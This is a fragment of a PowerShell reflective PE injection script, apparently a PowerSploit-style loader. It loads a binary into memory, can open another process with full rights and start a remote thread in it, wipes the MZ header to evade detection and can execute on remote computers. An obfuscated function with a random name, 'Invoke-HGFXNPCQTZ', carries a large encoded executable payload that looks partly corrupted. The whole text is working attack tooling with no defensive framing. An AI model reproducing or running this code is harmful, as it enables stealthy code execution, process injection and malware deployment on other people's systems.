				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}

				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}


		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants

		$RemoteProcHandle = [IntPtr]::Zero


		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}









		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}

			Write-Verbose "Got the handle for the remote process to inject in to"
		}



		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}

		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1]



		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{



	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {

				    }
					else
					{
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
					}
	            }
	        }



		}

		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{

			}
			else{
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle


			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
			}
		}



		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{

		}
		else
		{






		}

		Write-Verbose "Done!"
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}

	Write-Verbose "PowerShell ProcessID: $PID"


	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {


		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}


	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

function Invoke-HGFXNPCQTZ
{

$PEBytes32 = "TVogAyAgIAQgICAgICAgICAgICBAICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAOHw4gCSEBTCFUaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4KJCAgICAgICAbenp6JHokekAGenp6CiR6CiR6UmljaHogICAgICAgICAgICAgICAgUEUgIEwBBSBbd1wgICAgICAgICACIQoBDiAgICAgASAgICAgNiAgIBAgICAgICAgIBAgECAgIAIgIAUgASAgICAgBSABICAgICAgAiAgBCAgICAgIAIgQCAgIBAgIBAgICAgECAgECAgICAgIBAgICAgICAgICAgIAEgKCAgICAgICAgICAgICAgICAgICAgICAgICAgICACIFAFICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAQICAgICAgICAgICAgICAgICAgICAgICAgICAgLnRleHQgICAgICAQICAgICAgBCAgICAgICAgICAgICAgICAgLnJkYXRhICAgICAgICAgICAgICAgICAgICAgICAgIEAgIEAuZGF0YSAgIBcgICABICAWICAgASAgICAgICAgICAgICBAICAucG90NXM4ICAgICABICAgICABICAgICAgICAgICAgIEAgIC5yZWxvYyAgUAUgICACICAGICAgfgIgICAgICAgICAgICAgQCAgQiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg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